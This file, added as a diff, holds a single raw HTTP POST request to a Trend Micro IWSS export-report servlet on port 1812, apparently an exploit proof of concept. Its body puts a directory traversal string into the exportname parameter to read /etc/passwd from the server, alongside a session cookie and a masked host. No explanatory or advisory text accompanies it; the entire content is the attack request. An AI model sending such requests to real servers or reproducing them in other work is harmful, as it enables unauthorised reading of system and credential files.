@@ -1,0 +1,29 @@
+POST /servlet/com.trend.iwss.gui.servlet.exportreport HTTP/1.1
+
+Host: xxx.xxx.xx.xx:1812
+
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-us,en;q=0.5
+
+Accept-Encoding: gzip,deflate
+
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+
+Keep-Alive: 300
+
+Proxy-Connection: keep-alive
+
+Referer: http://xxx.xxx.xx.xx:1812/summary_threat.jsp
+
+Cookie: JSESSIONID=D122F55EA4D2A5FA1E7AE4582085F370
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 99
+
+ 
+
+op=refresh&summaryinterval=7&exportname=../../../../../../../../../../etc/passwd&exportfilesize=443
